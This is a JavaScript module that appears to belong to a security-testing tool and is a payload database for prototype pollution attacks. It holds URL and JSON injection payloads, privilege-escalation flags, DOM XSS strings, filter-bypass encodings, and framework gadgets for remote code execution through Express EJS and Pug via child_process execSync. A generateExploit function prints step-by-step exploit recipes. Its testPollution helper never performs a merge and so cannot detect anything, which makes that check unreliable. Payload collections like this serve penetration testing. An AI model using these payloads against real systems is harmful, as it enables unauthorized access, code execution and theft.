// Prototype Pollution Vulnerability Payloads
// Comprehensive payload database for prototype pollution security testing

const PrototypePollutionPayloads = {
    // Client-side prototype pollution via URL
    urlPayloads: [
        { payload: '__proto__[test]=polluted', description: 'Basic __proto__ injection' },
        { payload: '__proto__.test=polluted', description: 'Dot notation' },
        { payload: 'constructor[prototype][test]=polluted', description: 'Constructor prototype' },
        { payload: 'constructor.prototype.test=polluted', description: 'Constructor dot notation' },
        { payload: '__proto__[innerHTML]=<img/src/onerror=alert(1)>', description: 'XSS via innerHTML' },
        { payload: '__proto__[src]=data:,alert(1)//', description: 'XSS via src attribute' },
        { payload: '__proto__[onload]=alert(1)', description: 'XSS via onload' },
        { payload: '__proto__[onclick]=alert(1)', description: 'XSS via onclick' }
    ],

    // JSON body payloads
    jsonPayloads: [
        { payload: '{"__proto__":{"test":"polluted"}}', description: 'JSON __proto__' },
        { payload: '{"constructor":{"prototype":{"test":"polluted"}}}', description: 'JSON constructor.prototype' },
        { payload: '{"__proto__":{"isAdmin":true}}', description: 'Privilege escalation' },
        { payload: '{"__proto__":{"admin":true}}', description: 'Admin flag pollution' },
        { payload: '{"__proto__":{"role":"admin"}}', description: 'Role pollution' },
        { payload: '{"__proto__":{"status":200}}', description: 'Status code pollution' }
    ],

    // Server-side prototype pollution
    serverSidePayloads: [
        { payload: '{"__proto__":{"shell":"node"}}', description: 'Shell command injection' },
        { payload: '{"__proto__":{"NODE_OPTIONS":"--inspect"}}', description: 'Node options pollution' },
        { payload: '{"__proto__":{"argv0":"node"}}', description: 'argv0 pollution' },
        { payload: '{"__proto__":{"env":{"EVIL":"true"}}}', description: 'Environment pollution' }
    ],

    // Gadgets for exploitation
    gadgets: {
        jquery: [
            { property: 'jquery', value: '<script>alert(1)</script>', description: 'jQuery gadget' }
        ],
        lodash: [
            { property: 'sourceURL', value: '\\u000aalert(1)//', description: 'Lodash sourceURL' }
        ],
        express: [
            { property: 'outputFunctionName', value: 'x]});process.mainModule.require("child_process").execSync("id");({[', description: 'Express EJS RCE' }
        ],
        pug: [
            { property: 'block', value: '{"type":"Text","val":"x]};process.mainModule.require(\'child_process\').execSync(\'id\');//"}', description: 'Pug RCE' }
        ],
        handlebars: [
            { property: 'allowProtoPropertiesByDefault', value: true, description: 'Handlebars bypass' }
        ]
    },

    // DOM clobbering related
    domClobbering: [
        { element: '<form id=x><input id=y>', description: 'Form clobbering' },
        { element: '<a id=x><a id=x name=y href=1>', description: 'Anchor clobbering' },
        { element: '<img name=x>', description: 'Image clobbering' }
    ],

    // Detection payloads
    detectionPayloads: [
        { payload: '__proto__[pptest123]=true', check: 'pptest123', description: 'Detection test 1' },
        { payload: 'constructor.prototype.pptest456=true', check: 'pptest456', description: 'Detection test 2' }
    ],

    // Bypass techniques
    bypassTechniques: [
        { technique: 'Unicode encoding', payload: '__pro\\u0074o__', description: 'Unicode bypass' },
        { technique: 'Nested objects', payload: '{"a":{"__proto__":{"test":1}}}', description: 'Nested pollution' },
        { technique: 'Array notation', payload: 'a[__proto__][test]=1', description: 'Array notation' }
    ]
};

// Test types
const PrototypePollutionTests = {
    clientSide: {
        name: 'Client-side Prototype Pollution',
        description: 'Pollute Object.prototype via URL/query params',
        severity: 'HIGH'
    },
    serverSide: {
        name: 'Server-side Prototype Pollution',
        description: 'Pollute prototype on server for RCE',
        severity: 'CRITICAL'
    },
    domXss: {
        name: 'DOM XSS via Prototype Pollution',
        description: 'Achieve XSS through prototype pollution',
        severity: 'HIGH'
    },
    privilegeEsc: {
        name: 'Privilege Escalation',
        description: 'Bypass authorization via pollution',
        severity: 'CRITICAL'
    }
};

// Helper functions
function getUrlPayloads() {
    return PrototypePollutionPayloads.urlPayloads;
}

function getJsonPayloads() {
    return PrototypePollutionPayloads.jsonPayloads;
}

function getServerSidePayloads() {
    return PrototypePollutionPayloads.serverSidePayloads;
}

function getGadgets(framework) {
    return PrototypePollutionPayloads.gadgets[framework] || [];
}

function getPayloadCount() {
    return PrototypePollutionPayloads.urlPayloads.length +
        PrototypePollutionPayloads.jsonPayloads.length +
        PrototypePollutionPayloads.serverSidePayloads.length +
        PrototypePollutionPayloads.bypassTechniques.length +
        Object.values(PrototypePollutionPayloads.gadgets).flat().length;
}

function generateExploit(type) {
    switch (type) {
        case 'client':
            return `# Client-side Prototype Pollution

# Step 1: Test for pollution via URL
https://target.com/?__proto__[test]=polluted

# Step 2: Check in browser console
> ({}).test
> "polluted"  // Vulnerable!

# Step 3: Exploit for XSS (find a gadget)
# If site uses innerHTML from object property:
https://target.com/?__proto__[innerHTML]=<img/src/onerror=alert(1)>

# Common sinks:
# - element.innerHTML
# - jQuery.html()
# - document.write()`;

        case 'server':
            return `# Server-side Prototype Pollution (RCE)

# Test endpoint that merges JSON
POST /api/user HTTP/1.1
Content-Type: application/json

{
  "__proto__": {
    "isAdmin": true
  }
}

# EJS Template RCE (if using Express + EJS):
{
  "__proto__": {
    "outputFunctionName": "x]});process.mainModule.require('child_process').execSync('id');({["
  }
}

# Trigger by accessing any EJS-rendered page`;

        case 'xss':
            return `# DOM XSS via Prototype Pollution

# jQuery gadget (if jQuery parses user object):
https://target.com/?__proto__[jquery]=<script>alert(1)</script>

# Lodash sourceURL gadget:
https://target.com/?__proto__[sourceURL]=%0aalert(1)//

# innerHTML pollution:
https://target.com/?__proto__[innerHTML]=<img src=x onerror=alert(1)>

# Script src pollution:
https://target.com/?__proto__[src]=data:,alert(1)//`;

        case 'bypass':
            return `# Prototype Pollution Bypass Techniques

# Unicode encoding:
?__pro\\u0074o__[test]=polluted

# Nested pollution:
{"user":{"__proto__":{"admin":true}}}

# Constructor notation:
?constructor[prototype][test]=polluted
?constructor.prototype.test=polluted

# Array-like access:
?a[__proto__][test]=polluted

# Double encoding:
?__%70roto__[test]=polluted`;

        default:
            return '';
    }
}

function testPollution() {
    // Test if prototype pollution is possible
    const testObj = {};
    try {
        const payload = JSON.parse('{"__proto__":{"ppTestMarker":true}}');
        // Simulated merge function
        return testObj.ppTestMarker === true;
    } catch {
        return false;
    }
}

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        PrototypePollutionPayloads,
        PrototypePollutionTests,
        getUrlPayloads,
        getJsonPayloads,
        getServerSidePayloads,
        getGadgets,
        getPayloadCount,
        generateExploit,
        testPollution
    };
}
